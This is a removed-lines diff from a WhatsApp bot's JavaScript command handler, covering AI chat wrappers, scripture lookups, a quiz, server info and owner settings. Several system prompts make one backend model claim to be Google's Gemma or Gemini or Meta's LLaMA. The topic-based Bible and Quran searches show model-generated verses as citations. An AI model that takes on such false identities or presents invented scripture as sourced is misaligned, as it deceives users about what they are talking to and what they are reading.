-      reply(json.result.toString())
-    }
-
-  } catch (e) {
-    console.error(e)
-    return reply(`❌ Error\nLogs error : ${(e?.message || e).toString()}`)
-  }
-}
-break
-
-case 'magicstudio':{
-if (!text) return reply(`╔══════════════════════════╗\n║  ✨ *MAGIC STUDIO AI*\n╚══════════════════════════╝\n\n  Generate stunning AI images instantly.\n\n  └ *Usage:* ${prefix}magicstudio [description]\n\n  _Examples:_\n  • a woman in a red dress in Paris\n  • cyberpunk warrior with glowing sword\n  • magical forest with fairy lights`)
-try {
-await reply('✨ _Magic Studio is generating your image..._')
-// Use pollinations with artistic model parameters for magic studio style
-let enhancedPrompt = text + ', highly detailed, professional quality, vivid colors, artistic masterpiece'
-let seed = Math.floor(Math.random() * 999999)
-let imgUrl = `https://image.pollinations.ai/prompt/${encodeURIComponent(enhancedPrompt)}?model=flux&width=1024&height=1024&seed=${seed}&nologo=true&enhance=true`
-let imgBuffer = await getBuffer(imgUrl)
-if (!imgBuffer || imgBuffer.length < 5000) throw new Error('Generation failed')
-let caption = `╔══════════════════════════╗\n║  ✨ *MAGIC STUDIO*\n╚══════════════════════════╝\n\n  ├ 📝 *Prompt* › ${text}\n  ├ 🌟 *Style*  › Magic Studio\n  └ 🎲 *Seed*   › ${seed}`
-await X.sendMessage(m.chat, { image: imgBuffer, caption }, { quoted: m })
-} catch(e) {
-try {
-let seed2 = Math.floor(Math.random() * 999999)
-let fallbackUrl = `https://image.pollinations.ai/prompt/${encodeURIComponent(text + ', professional, high quality')}?width=1024&height=1024&seed=${seed2}&nologo=true`
-await X.sendMessage(m.chat, { image: { url: fallbackUrl }, caption: `✨ *Magic Studio:* ${text}` }, { quoted: m })
-} catch(e2) { reply(`❌ *Magic Studio failed.*\n_${e2.message || 'Try again shortly.'}_`) }
-}
-}
-break
-
-case 'gemmaai':{
-  if (!text) return reply(`Example: ${prefix+command} Hello, how are you?`)
-  try {
-    await X.sendMessage(m.chat, { react: { text: '💠', key: m.key } })
-    const { data } = await axios.post('https://text.pollinations.ai/openai', {
-      model: 'openai',
-      messages: [
-        { role: 'system', content: 'You are Gemma AI, a lightweight but powerful AI by Google. Provide clear and helpful responses.' },
-        { role: 'user', content: text }
-      ],
-      stream: false
-    }, { headers: { 'Content-Type': 'application/json' }, timeout: 30000 })
-    const result = data?.choices?.[0]?.message?.content
-    if (!result) throw new Error('Empty response')
-    reply(result)
-  } catch (e) {
-    console.error('[GEMMAAI ERROR]', e.message)
-    reply('❌ gemmaai is currently unavailable. Please try again.')
-  }
-}
-break
-case 'aivelyn':
-case 'velynai':{
-  if (!text) return reply('Please enter your question?');
-  try {
-    const url = `https://www.velyn.biz.id/api/ai/velyn-1.0-1b?prompt=${encodeURIComponent(text)}`;
-    const response = await fetch(url);
-
-    if (!response.ok) {
-      throw new Error(`HTTP error! Status: ${response.status}`);
-    }
-
-    const data = await response.json();
-    const result = data.result || "Sorry, no answer available.";
-
-    return reply(result);
-  } catch (error) {
-    console.error("An error occurred:", error);
-    try {
-      let { data } = await axios.post('https://text.pollinations.ai/openai', {
-        messages: [{ role: 'system', content: 'You are Velyn AI, a creative and helpful AI assistant.' }, { role: 'user', content: text }],
-        model: 'openai', stream: false
-      }, { headers: { 'Content-Type': 'application/json' } })
-      return reply(data?.choices?.[0]?.message?.content || 'No response.')
-    } catch { return reply("Sorry, an error occurred while contacting the AI.") }
-  }
-}
-break
-
-case 'muslimprayer':
-case 'islamprayer':
-case 'prayermuslim': {
-    await X.sendMessage(m.chat, { react: { text: '🕌', key: m.key } })
-    if (!isOwner) return reply(mess.OnlyOwner)
-    const _arg = (text || '').toLowerCase().trim()
-    const _valid = ['on', 'off', 'dm', 'group', 'all', 'status']
-    if (_arg === 'status' || !_arg) {
-        const _cur = global.muslimPrayer || 'off'
-        return reply(`╔══════════════════════════╗\n║  🕌 *MUSLIM PRAYER REMINDER*\n╚══════════════════════════╝\n\n  ├ 📊 *Status* › *${_cur.toUpperCase()}*\n\n  ├ ${prefix}muslimprayer on    — DM + groups\n  ├ ${prefix}muslimprayer dm    — DM only\n  ├ ${prefix}muslimprayer group — groups only\n  └ ${prefix}muslimprayer off   — disable`)
-    }
-    if (!_valid.includes(_arg)) return reply(`❌ Invalid. Use: on · off · dm · group · all`)
-    global.muslimPrayer = _arg === 'on' ? 'all' : _arg
-    const _labels = { all: '✅ ON (DM + Groups)', dm: '✅ ON (DM only)', group: '✅ ON (Groups only)', off: '❌ OFF' }
-    reply(`🕌 *Muslim Prayer Reminder* › ${_labels[global.muslimPrayer]}`)
-}
-break
-
-case 'christianprayer':
-case 'devotion':
-case 'prayerchristian': {
-    await X.sendMessage(m.chat, { react: { text: '✝️', key: m.key } })
-    if (!isOwner) return reply(mess.OnlyOwner)
-    const _arg2 = (text || '').toLowerCase().trim()
-    const _valid2 = ['on', 'off', 'dm', 'group', 'all', 'status']
-    if (_arg2 === 'status' || !_arg2) {
-        const _cur2 = global.christianDevotion || 'off'
-        return reply(`╔══════════════════════════╗\n║  ✝️  *CHRISTIAN DEVOTION*\n╚══════════════════════════╝\n\n  ├ 📊 *Status* › *${_cur2.toUpperCase()}*\n\n  ├ ${prefix}christianprayer on    — DM + groups\n  ├ ${prefix}christianprayer dm    — DM only\n  ├ ${prefix}christianprayer group — groups only\n  └ ${prefix}christianprayer off   — disable`)
-    }
-    if (!_valid2.includes(_arg2)) return reply(`❌ Invalid. Use: on · off · dm · group · all`)
-    global.christianDevotion = _arg2 === 'on' ? 'all' : _arg2
-    const _labels2 = { all: '✅ ON (DM + Groups)', dm: '✅ ON (DM only)', group: '✅ ON (Groups only)', off: '❌ OFF' }
-    reply(`✝️ *Christian Devotion* › ${_labels2[global.christianDevotion]}`)
-}
-break
-
-case 'muslimai':{
-  if (!text) return reply('Please enter your question?');
-  try {
-    const result = await muslimai(text);
-
-    if (result.error) return reply(result.error);
-
-    let sourcesText = result.sources.length > 0 
-        ? result.sources.map((src, index) => `${index + 1}. *${src.title}*\n🔗 ${src.url}`).join("\n\n")
-        : "No sources found.";
-
-    let responseMessage = `ᴘᴏᴡᴇʀᴇᴅ ᴡɪᴛʜ ᴍᴜsʟɪᴍᴀɪ\n\n${result.answer}`;
-
-    reply(responseMessage);
-} catch (error) {
-    console.error("⚠ *Error* :", error);
-    reply("An error occurred.");
-}
-}
-break;
-
-case 'bible':
-case 'verse':
-case 'bibleverse': {
-    await X.sendMessage(m.chat, { react: { text: '📖', key: m.key } })
-    if (!text) {
-        return reply(`╔══════════════════════════╗\n║  📖 *BIBLE SEARCH*\n╚══════════════════════════╝\n\n  Search any verse or topic.\n\n  *By reference:*\n  ├ ${prefix}bible John 3:16\n  ├ ${prefix}bible Romans 8:28\n  └ ${prefix}bible Psalm 23:1\n\n  *By topic/keyword:*\n  ├ ${prefix}bible love\n  ├ ${prefix}bible faith\n  └ ${prefix}bible strength`)
-    }
-    try {
-        const isRef = /^[1-3]?\s?[a-zA-Z]+\s+\d+:\d+/i.test(text.trim())
-        let verseText = '', reference = '', translation = 'KJV'
-
-        if (isRef) {
-            const _bRef = encodeURIComponent(text.trim())
-            let _bRes = await fetch(`https://bible-api.com/${_bRef}?translation=kjv`)
-            let _bData = await _bRes.json()
-            if (_bData.error) {
-                _bRes = await fetch(`https://bible-api.com/${_bRef}?translation=web`)
-                _bData = await _bRes.json()
-                if (_bData.error) return reply(`❌ *Verse not found:* _${text}_\n\n_Check spelling, e.g._ *John 3:16* _or_ *Psalm 23:1*`)
-                translation = 'WEB'
-            }
-            verseText = _bData.text?.trim()
-            reference = _bData.reference
         } else {
-            const _aiRes = await fetch('https://text.pollinations.ai/openai', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    model: 'openai', stream: false, max_tokens: 300,
-                    messages: [
-                        { role: 'system', content: 'You are a Bible scholar. When given a topic or keyword, respond with ONLY three lines: Line 1: the verse text. Line 2: the reference (e.g. John 3:16). Line 3: the translation (e.g. KJV). No extra text.' },
-                        { role: 'user', content: `Give me a Bible verse about: ${text}` }
-                    ]
-                })
-            })
-            const _aiData = await _aiRes.json()
-            const _aiLines = (_aiData.choices?.[0]?.message?.content || '').trim().split('\n').filter(Boolean)
-            verseText = _aiLines[0] || ''
-            reference = _aiLines[1] || `Topic: ${text}`
-            translation = _aiLines[2] || 'KJV'
-        }
-
-        if (!verseText) return reply(`❌ Could not find a verse for: _${text}_`)
-
-        reply(`╔══════════════════════════╗\n║  📖 *BIBLE VERSE*\n╚══════════════════════════╝\n\n  _❝ ${verseText} ❞_\n\n  ├ 📌 *${reference}*\n  └ 📚 *Translation* › ${translation}\n\n_⚡ TOOSII-XD ULTRA_`)
-
-    } catch(e) {
-        reply(`❌ *Bible search failed.*\n_${e.message || 'Please try again.'}_`)
-    }
-}
-break;
-
-
-case 'quran':
-case 'ayah':
-case 'quranverse': {
-    await X.sendMessage(m.chat, { react: { text: '📿', key: m.key } })
-    if (!text) {
-        return reply(`╔══════════════════════════╗\n║  📿 *QURAN SEARCH*\n╚══════════════════════════╝\n\n  Search any ayah or topic.\n\n  *By reference (Surah:Ayah):*\n  ├ ${prefix}quran 2:255    (Ayatul Kursi)\n  ├ ${prefix}quran 1:1      (Al-Fatiha)\n  └ ${prefix}quran 112:1    (Al-Ikhlas)\n\n  *By topic/keyword:*\n  ├ ${prefix}quran patience\n  ├ ${prefix}quran mercy\n  └ ${prefix}quran paradise`)
-    }
-    try {
-        const isRef = /^\d+:\d+$/.test(text.trim())
-        let arabicText = '', englishText = '', reference = '', surahName = ''
-
-        if (isRef) {
-            const [surah, ayah] = text.trim().split(':')
-            // Fetch Arabic text
-            const _qAr = await fetch(`https://api.alquran.cloud/v1/ayah/${surah}:${ayah}/ar.alafasy`)
-            const _qArData = await _qAr.json()
-            // Fetch English translation
-            const _qEn = await fetch(`https://api.alquran.cloud/v1/ayah/${surah}:${ayah}/en.asad`)
-            const _qEnData = await _qEn.json()
-
-            if (_qArData.code !== 200) return reply(`❌ *Ayah not found:* _${text}_\n\n_Check format, e.g._ *2:255* _(Surah:Ayah)_`)
-
-            arabicText = _qArData.data?.text || ''
-            englishText = _qEnData.data?.text || ''
-            surahName = _qArData.data?.surah?.englishName || ''
-            const surahNameAr = _qArData.data?.surah?.name || ''
-            reference = `${surahName} (${surahNameAr}) — ${surah}:${ayah}`
-        } else {
-            // Keyword search via AI
-            const _aiRes = await fetch('https://text.pollinations.ai/openai', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    model: 'openai', stream: false, max_tokens: 400,
-                    messages: [
-                        { role: 'system', content: 'You are a Quran scholar. When given a topic or keyword, respond with ONLY four lines: Line 1: the Arabic ayah text. Line 2: the English translation. Line 3: the reference (e.g. Al-Baqarah 2:155). Line 4: translator (e.g. Muhammad Asad). No extra text, no explanation.' },
-                        { role: 'user', content: `Give me a Quran ayah about: ${text}` }
-                    ]
-                })
-            })
-            const _aiData = await _aiRes.json()
-            const _aiLines = (_aiData.choices?.[0]?.message?.content || '').trim().split('\n').filter(Boolean)
-            arabicText = _aiLines[0] || ''
-            englishText = _aiLines[1] || ''
-            reference = _aiLines[2] || `Topic: ${text}`
-            surahName = _aiLines[3] || 'Muhammad Asad'
-        }
-
-        if (!englishText && !arabicText) return reply(`❌ Could not find an ayah for: _${text}_`)
-
-        let msg = `╔══════════════════════════╗\n║  📿 *QURAN AYAH*\n╚══════════════════════════╝\n\n`
-        if (arabicText) msg += `  *${arabicText}*\n\n`
-        if (englishText) msg += `  _❝ ${englishText} ❞_\n\n`
-        msg += `  ├ 📌 *${reference}*\n`
-        msg += `  └ 📚 *Translator* › ${isRef ? 'Muhammad Asad' : surahName}\n\n`
-        msg += `_⚡ TOOSII-XD ULTRA_`
-
-        reply(msg)
-
-    } catch(e) {
-        reply(`❌ *Quran search failed.*\n_${e.message || 'Please try again.'}_`)
-    }
-}
-break;
-
-
-case 'llama-ai':{
-  if (!text) return reply(`Example: ${prefix+command} Hello, how are you?`)
-  try {
-    await X.sendMessage(m.chat, { react: { text: '🦙', key: m.key } })
-    const { data } = await axios.post('https://text.pollinations.ai/openai', {
-      model: 'openai',
-      messages: [
-        { role: 'system', content: 'You are LLaMA AI, a powerful open-source AI model by Meta. Be helpful, accurate and conversational.' },
-        { role: 'user', content: text }
-      ],
-      stream: false
-    }, { headers: { 'Content-Type': 'application/json' }, timeout: 30000 })
-    const result = data?.choices?.[0]?.message?.content
-    if (!result) throw new Error('Empty response')
-    reply(result)
-  } catch (e) {
-    console.error('[LLAMA-AI ERROR]', e.message)
-    reply('❌ llama-ai is currently unavailable. Please try again.')
-  }
-}
-break
-
-case 'gptturbo':{
-if (!text) return reply(`Example:\n${prefix}${command} Hello?`);
-try {
-  let result = null
-  try {
-    const response = await fetch(`https://restapii.rioooxdzz.web.id/api/gptturbo?message=${encodeURIComponent(text)}`, { headers: { "User-Agent": "Mozilla/5.0" } });
-    if (response.ok) { const json = await response.json(); result = json?.data?.response }
-  } catch {}
-  if (!result) {
-    let { data } = await axios.post('https://text.pollinations.ai/openai', { messages: [{ role: 'system', content: 'You are GPT Turbo, a fast and intelligent AI assistant. Provide clear, helpful responses.' }, { role: 'user', content: text }], model: 'openai', stream: false }, { headers: { 'Content-Type': 'application/json' } })
-    result = data?.choices?.[0]?.message?.content
-  }
-  let turbo = `Title : ${text}\n\nMessage : ${result || 'No response.'}\n`;
-  await X.sendMessage(m.chat, { text: "⬣───「 *G P T T U R B O* 」───⬣" + "\n\n" + turbo }, { quoted: m });
-} catch (e) { reply('Error: ' + (e.message || 'Failed')) }
-}
-break
-
-case 'gemini-ai':{  
-    const isQuotedImage = m.quoted && m.quoted.mtype === 'imageMessage';
-    const isImage = m.mtype === 'imageMessage';
-    const quoted = m.quoted ? m.quoted : m;
-
-    if (isImage || isQuotedImage) {
-        try {
-
-            const mediaPath = await X.downloadAndSaveMediaMessage(quoted);
-            const media = fs.readFileSync(mediaPath);
-
-            const uploadedImageUrl = await uploadImage(media);
-            console.log('Image uploaded successfully:', uploadedImageUrl);
-
-            const apiUrl = `https://gemini-api-5k0h.onrender.com/gemini/image`;
-            const params = {
-                q: 'What is this picture? Please describe it.',
-                url: uploadedImageUrl
-            };
-
-            const response = await axios.get(apiUrl, { params });
-            const description = response.data?.content || 'Failed to get image description.';
-
-            await X.sendMessage(m.chat, {
-                text: `📷 *Image Description:*\n${description}`
-            }, { quoted: m });
-
-            fs.unlinkSync(mediaPath);
-        } catch (error) {
-            console.error('Error deskripsi gambar:', error);
-            await X.sendMessage(m.chat, {
-                text: 'An error occurred while processing the image.'
-            }, { quoted: m });
-        }
-    } else {
-        try {
-            if (!text) return reply(`Example: ${prefix+command} Who is Elon Musk`);
-            const apiUrl = `https://gemini-api-5k0h.onrender.com/gemini/chat`;
-            const params = { q: text };
-
-            const response = await axios.get(apiUrl, { params });
-            const replyText = response.data?.content || 'Failed to get respons AI.';
-
-            await X.sendMessage(m.chat, {
-                text: `🤖 *AI Gemini:*\n${replyText}`
-            }, { quoted: m });
-        } catch (error) {
-            console.error('Error Gemini Chat:', error);
+            // Buffer.from failed — try raw JSON
             try {
-              let { data } = await axios.post('https://text.pollinations.ai/openai', {
-                messages: [{ role: 'system', content: 'You are Gemini AI, a powerful AI assistant by Google. Provide detailed and accurate answers.' }, { role: 'user', content: text }],
-                model: 'openai', stream: false
-              }, { headers: { 'Content-Type': 'application/json' } })
-              await X.sendMessage(m.chat, { text: `🤖 *AI Gemini:*\n${data?.choices?.[0]?.message?.content || 'No response.'}` }, { quoted: m })
-            } catch { await X.sendMessage(m.chat, { text: 'An error occurred while processing the AI request.' }, { quoted: m }) }
-        }
-    }
-};
-break
-
-case 'lumin-ai':{
-  if (!text) return reply(`Example: ${prefix+command} Hello, how are you?`)
-  try {
-    await X.sendMessage(m.chat, { react: { text: '💡', key: m.key } })
-    const { data } = await axios.post('https://text.pollinations.ai/openai', {
-      model: 'openai',
-      messages: [
-        { role: 'system', content: 'You are Lumin AI, a bright and insightful AI assistant. Provide illuminating and clear answers.' },
-        { role: 'user', content: text }
-      ],
-      stream: false
-    }, { headers: { 'Content-Type': 'application/json' }, timeout: 30000 })
-    const result = data?.choices?.[0]?.message?.content
-    if (!result) throw new Error('Empty response')
-    reply(result)
-  } catch (e) {
-    console.error('[LUMIN-AI ERROR]', e.message)
-    reply('❌ lumin-ai is currently unavailable. Please try again.')
-  }
-}
-break
-
-case 'typli-ai':{
-  if (!text) return reply(`Example: ${prefix+command} Hello, how are you?`)
-  try {
-    await X.sendMessage(m.chat, { react: { text: '✍️', key: m.key } })
-    const { data } = await axios.post('https://text.pollinations.ai/openai', {
-      model: 'openai',
-      messages: [
-        { role: 'system', content: 'You are Typli AI, a versatile AI writing assistant. Help with writing, editing and creative content.' },
-        { role: 'user', content: text }
-      ],
-      stream: false
-    }, { headers: { 'Content-Type': 'application/json' }, timeout: 30000 })
-    const result = data?.choices?.[0]?.message?.content
-    if (!result) throw new Error('Empty response')
-    reply(result)
-  } catch (e) {
-    console.error('[TYPLI-AI ERROR]', e.message)
-    reply('❌ typli-ai is currently unavailable. Please try again.')
-  }
-}
-break;
-
-case 'poly-ai':{
-  if (!text) return reply(`Example: ${prefix+command} Hello, how are you?`)
-  try {
-    await X.sendMessage(m.chat, { react: { text: '🌐', key: m.key } })
-    const { data } = await axios.post('https://text.pollinations.ai/openai', {
-      model: 'openai',
-      messages: [
-        { role: 'system', content: 'You are Poly AI, a conversational AI assistant. Be engaging, friendly and informative.' },
-        { role: 'user', content: text }
-      ],
-      stream: false
-    }, { headers: { 'Content-Type': 'application/json' }, timeout: 30000 })
-    const result = data?.choices?.[0]?.message?.content
-    if (!result) throw new Error('Empty response')
-    reply(result)
-  } catch (e) {
-    console.error('[POLY-AI ERROR]', e.message)
-    reply('❌ poly-ai is currently unavailable. Please try again.')
-  }
-}
-break
-
-case 'gemini-pro':{
-  if (!text) return reply(`Example: ${prefix+command} Hello, how are you?`)
-  try {
-    await X.sendMessage(m.chat, { react: { text: '🌟', key: m.key } })
-    const { data } = await axios.post('https://text.pollinations.ai/openai', {
-      model: 'openai',
-      messages: [
-        { role: 'system', content: 'You are Gemini Pro, a powerful AI assistant by Google. Provide comprehensive and accurate answers.' },
-        { role: 'user', content: text }
-      ],
-      stream: false
-    }, { headers: { 'Content-Type': 'application/json' }, timeout: 30000 })
-    const result = data?.choices?.[0]?.message?.content
-    if (!result) throw new Error('Empty response')
-    reply(result)
-  } catch (e) {
-    console.error('[GEMINI-PRO ERROR]', e.message)
-    reply('❌ gemini-pro is currently unavailable. Please try again.')
-  }
-}
-break;
-case 'tebak': {
-    await X.sendMessage(m.chat, { react: { text: '🧩', key: m.key } })
-  const quizPath = './database/tebakgame.json';
-  if (!fs.existsSync(quizPath)) return reply('⚠️ Quiz data file not found.');
-
-  const data = JSON.parse(fs.readFileSync(quizPath));
-  const kategoriUnik = [...new Set(data.map(item => item.kategori))];
-
-  const kategori = args[0]?.toLowerCase();
-  if (!kategori) {
-    const daftar = kategoriUnik.join(', ');
-    return reply(`📚 Usage: .tebak [category]\nExample: .tebak lagu\n\nAvailable categories:\n${daftar}`);
-  }
-
-  if (!kategoriUnik.includes(kategori)) {
-    return reply(`❌ Kategori "${kategori}" not found.\nAvailable categories: ${kategoriUnik.join(', ')}`);
-  }
-  const soalKategori = data.filter(item => item.kategori === kategori);
-  const soal = soalKategori[Math.floor(Math.random() * soalKategori.length)];
-
-  if (!global.tebakGame) global.tebakGame = {};
-  if (global.tebakGame[m.sender]) {
-    return reply('⚠️ You still have an unanswered question! Answer it or type giveup first.');
-  }
-
-  global.tebakGame[m.sender] = {
-    jawaban: soal.jawaban,
-    soal: soal.soal,
-    petunjuk: soal.petunjuk || 'No hint available',
-    timeout: setTimeout(() => {
-      if (global.tebakGame[m.sender]) {
-        reply(`⏰ Time is up!\nThe correct answer is:\n✅ *${global.tebakGame[m.sender].jawaban}*`);
-        delete global.tebakGame[m.sender];
-      }
-    }, 60000) // 60 detik
-  };
-
-  return reply(`╔══════════════════════════╗\n║  🧠 *GUESS THE ${kategori.toUpperCase()}*\n╚══════════════════════════╝\n\n  ${soal.soal}\n\n  ⏱️ *60 seconds* — reply to answer!`);
-}
-break;
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// Info Bot             
-case 'debugrole': {
-    await X.sendMessage(m.chat, { react: { text: '🔍', key: m.key } })
-    if (!isOwner) return reply('Owner only.')
-    let dbgMsg = `*🔍 ROLE DEBUG INFO*\n\n`
-    dbgMsg += `*Bot Identity:*\n`
-    dbgMsg += `• X.user.id: ${X.user?.id || 'null'}\n`
-    dbgMsg += `• X.user.lid: ${X.user?.lid || 'null'}\n`
-    dbgMsg += `• botJid (decoded): ${botJid}\n`
-    dbgMsg += `• botLid (decoded): ${botLid || 'null'}\n\n`
-    dbgMsg += `*Sender Identity:*\n`
-    dbgMsg += `• m.sender: ${m.sender}\n`
-    dbgMsg += `• m.key.participant: ${m.key?.participant || 'null'}\n`
-    dbgMsg += `• senderFromKey: ${senderFromKey || 'null'}\n\n`
-    dbgMsg += `*Role Results:*\n`
-    dbgMsg += `• isGroup: ${isGroup}\n`
-    dbgMsg += `• isOwner: ${isOwner}\n`
-    dbgMsg += `• isAdmins: ${isAdmins}\n`
-    dbgMsg += `• isBotAdmins: ${isBotAdmins}\n`
-    dbgMsg += `• isSuperAdmin: ${isSuperAdmin}\n\n`
-    if (isGroup && participants) {
-        dbgMsg += `*Admin Participants:*\n`
-        participants.filter(p => p.admin).forEach(p => {
-            let matchBot = isParticipantBot(p)
-            let matchSender = isParticipantSender(p)
-            dbgMsg += `• ${p.id}\n`
-            dbgMsg += `  role: ${p.admin} | isBot: ${matchBot} | isSender: ${matchSender}\n`
-            dbgMsg += `  sameAsUserId: ${isSameUser(p.id, X.user.id)} | sameAsLid: ${X.user?.lid ? isSameUser(p.id, X.user.lid) : 'no lid'}\n`
-        })
-    }
-    reply(dbgMsg)
-}
-break;
-
-case 'p':
-case 'ping':
-case 'info':
-case 'storage':
-case 'server':
-case 'srvinfo': {
-    await X.sendMessage(m.chat, { react: { text: command === 'ping' ? '🏓' : '🖥️', key: m.key } })
-
-  function formatp(bytes) {
-    if (bytes < 1024) return `${bytes} B`
-    const kb = bytes / 1024
-    if (kb < 1024) return `${kb.toFixed(2)} KB`
-    const mb = kb / 1024
-    if (mb < 1024) return `${mb.toFixed(2)} MB`
-    const gb = mb / 1024
-    return `${gb.toFixed(2)} GB`
-  }
-
-async function getServerInfo() {
-  const start = Date.now()
-
-  const osType = os.type()
-  const release = os.release()
-  const arch = os.arch()
-  const nodeVersion = process.version
-  const platform = os.platform()
-
-  const cpus = os.cpus()
-  const cpuModel = cpus.length > 0 ? cpus[0].model : 'Unknown'
-  const coreCount = cpus.length
-  let cpuUsage = '0%'
-  if (cpus.length > 0) {
-    const cpu = cpus.reduce((acc, c) => {
-      acc.total += Object.values(c.times).reduce((a, b) => a + b, 0)
-      acc.user += c.times.user
-      acc.sys += c.times.sys
-      acc.speed += c.speed
-      return acc
-    }, { speed: 0, total: 0, user: 0, sys: 0 })
-    cpuUsage = ((cpu.user + cpu.sys) / cpu.total * 100).toFixed(2) + '%'
-  }
-  const loadAverage = os.loadavg().map(l => l.toFixed(2))
-  const totalMem = os.totalmem()
-  const freeMem = os.freemem()
-  const usedMem = totalMem - freeMem
-
-  let storageText = ''
-  try {
-    const storageInfo = await nou.drive.info()
-    if (storageInfo && storageInfo.totalGb) {
-      storageText = `\n*STORAGE*\n• Total: ${storageInfo.totalGb} GB\n• Used: ${storageInfo.usedGb} GB (${storageInfo.usedPercentage}%)\n• Available: ${storageInfo.freeGb} GB (${storageInfo.freePercentage}%)`
-    }
-  } catch(e) {}
-
-  const latensi = (Date.now() - start)
-
-  const responseText = `╔══════════════════════════╗
-║  ⚡ *PONG!*  📡 *${latensi}ms*
-╚══════════════════════════╝
-  🤖 *${global.botname || 'TOOSII-XD ULTRA'}*
-
-  ├ 🟢 *Bot uptime*    › ${runtime(process.uptime())}
-  ├ 🖥️  *Server uptime* › ${runtime(os.uptime())}
-
-  ├ 🔧 *OS*      › ${osType} (${arch})
-  ├ 🟩 *Node.js* › ${nodeVersion}
-  ├ 💎 *CPU*     › ${cpuModel}
-  ├ ⚙️  *Cores*   › ${coreCount}  📊 *Load* › ${cpuUsage}
-
-  ├ 📦 *RAM Total* › ${formatp(totalMem)}
-  ├ 🔴 *RAM Used*  › ${formatp(usedMem)}
-  └ 🟢 *RAM Free*  › ${formatp(freeMem)}${storageText ? `
-
-  ┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄
-  💿 *Storage*
-  ${storageText.replace(/\*STORAGE\*\n/,'').replace(/• /g,'  ├ ')}` : ''}
-
-_⚡ Powered by ${global.ownername || 'Toosii Tech'}_`
-  return responseText.trim()
-}
-
-const responseText = await getServerInfo()
-await X.sendMessage(m.chat, { text: responseText }, { quoted: m })
-}
-break           
-
-case 'totalfitur':{
-reply(`╔══════════════════════════╗\n║  📋 *TOTAL COMMANDS*\n╚══════════════════════════╝\n\n  └ *${totalfitur()}* commands available`)
-}
-break   
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// OWNER MENU COMMANDS
-case 'autotyping': {
-    await X.sendMessage(m.chat, { react: { text: '⌨️', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let atArg = (args[0] || '').toLowerCase()
-if (atArg === 'on') { global.fakePresence = 'typing'; reply('*Auto Typing ON*') }
-else if (atArg === 'off') { global.fakePresence = 'off'; reply('*Auto Typing OFF*') }
-else reply(`*Auto Typing: ${global.fakePresence === 'typing' ? 'ON' : 'OFF'}*\nUsage: ${prefix}autotyping on/off`)
-} break
-
-case 'autoreact': {
-    await X.sendMessage(m.chat, { react: { text: '👍', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let arArg = (args[0] || '').toLowerCase()
-if (!arArg) { reply(`*Auto React: ${global.autoReact ? 'ON' : 'OFF'}*\nEmoji: ${global.autoReactEmoji || '👍'}\nUsage: ${prefix}autoreact on/off\n${prefix}autoreact [emoji]`) }
-else if (arArg === 'on') { global.autoReact = true; reply('*Auto React ON*') }
-else if (arArg === 'off') { global.autoReact = false; reply('*Auto React OFF*') }
-else { global.autoReact = true; global.autoReactEmoji = arArg; reply(`✅ *Auto React ON* › emoji: ${arArg}`) }
-} break
-
-case 'pmblocker': {
-    await X.sendMessage(m.chat, { react: { text: '🚫', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let pbArg = (args[0] || '').toLowerCase()
-if (pbArg === 'on') { global.pmBlocker = true; reply('*PM Blocker ON*\nNon-owner PMs will be auto-blocked.') }
-else if (pbArg === 'off') { global.pmBlocker = false; reply('*PM Blocker OFF*') }
-else reply(`*PM Blocker: ${global.pmBlocker ? 'ON' : 'OFF'}*\nUsage: ${prefix}pmblocker on/off`)
-} break
-
-case 'pp':
-case 'getpp': {
-    await X.sendMessage(m.chat, { react: { text: '🖼️', key: m.key } })
-// Get profile picture of sender, mentioned user, quoted user, or bot itself
-try {
-let target, label
-// Resolve JID to real phone number — handles normal JIDs and Baileys LID JIDs
-const _ppNum = (jid) => {
-    if (!jid) return 'Unknown'
-    const raw = jid.split('@')[0].split(':')[0]
-    // LID JIDs are very long numbers (>13 digits) — not real phone numbers
-    if (raw.length > 15) return 'Unknown'
-    return '+' + raw
-}
-const _ppLabel = async (jid) => {
-    if (!jid) return 'Unknown'
-    // If it's a LID JID (@lid), try to look up the real phone via onWhatsApp
-    const isLid = jid.endsWith('@lid')
-    if (isLid) {
-        try {
-            // Try to get real number from group participant list if in a group
-            if (m.isGroup && participants) {
-                const match = participants.find(p => p.id && p.id.includes(jid.split('@')[0]))
-                if (match && match.id && !match.id.endsWith('@lid')) {
-                    const num = '+' + match.id.split('@')[0]
-                    return num
-                }
-            }
-        } catch {}
-        return 'Unknown'
-    }
-    const num = _ppNum(jid)
-    try {
-        const info = await X.onWhatsApp(jid.split('@')[0])
-        const name = (info && info[0] && info[0].notify) ? info[0].notify : null
-        return name ? `${name} (${num})` : num
-    } catch { return num }
-}
-// Prefer real phone JID over LID JID
-const _resolveTarget = (jid) => {
-    if (!jid) return null
-    if (jid.endsWith('@lid') && m.isGroup && participants) {
-        const lidNum = jid.split('@')[0]
-        const real = participants.find(p => p.id && !p.id.endsWith('@lid') && p.lid && p.lid.includes(lidNum))
-        if (real) return real.id
-    }
-    return jid
-}
-if (m.mentionedJid && m.mentionedJid[0]) {
-    target = _resolveTarget(m.mentionedJid[0])
-    label = await _ppLabel(target)
-} else if (m.quoted) {
-    const rawTarget = m.quoted.sender || m.quoted.participant || m.quoted.key?.participant
-    target = _resolveTarget(rawTarget)
-    label = target ? await _ppLabel(target) : 'Unknown'
-} else if (text && /^[0-9]+$/.test(text.replace(/[^0-9]/g,''))) {
-    target = text.replace(/[^0-9]/g,'') + '@s.whatsapp.net'
-    label = await _ppLabel(target)
-} else {
-    target = m.sender
-    label = await _ppLabel(target)
-}
-if (!target) target = m.sender
-let ppUrl = null
-try { ppUrl = await X.profilePictureUrl(target, 'image') } catch {}
-if (!ppUrl) {
-    return reply(`╔══════════════════════════╗\n║  🖼️  *PROFILE PICTURE*\n╚══════════════════════════╝\n\n  ❌ *No profile picture for ${label}*\n  _Privacy restrictions or not on WhatsApp._`)
-}
-let ppBuf = await getBuffer(ppUrl)
-if (!ppBuf || ppBuf.length < 100) throw new Error('Failed to download picture')
-await X.sendMessage(m.chat, {
-    image: ppBuf,
